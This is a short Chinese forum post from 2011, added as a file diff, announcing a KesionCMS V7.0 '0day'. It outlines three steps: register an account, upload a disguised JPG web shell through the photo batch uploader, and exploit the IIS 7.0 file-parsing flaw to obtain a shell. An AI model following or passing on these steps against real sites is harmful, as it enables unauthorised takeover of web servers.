@@ -1,0 +1,10 @@
+KesionCMS V7.0 0day
+
+[漏洞案例:从KesionCMS V7.0 0day到土豆网被黑 全文]本帖最后由 vini5 于 2011-7-13 13:39 编辑 
+
+KesionCMS 科汛网站管理系统 V7.0 0day，通杀KesionCMS v7.0版本，利用条件必须基于iis7.0架设。(有点鸡肋)
+第一步：注册用户：
+http://www.sitedirsec.com/?do=reg
+第二步：访问相册直接点批量上传伪造好的jpg一句话(不要选择图片库里面上传)：
+http://www.sitedirsec.com/user/User_Photo.asp?Action=Add
+第三步：利用iis7.0解析漏洞拿下shell。
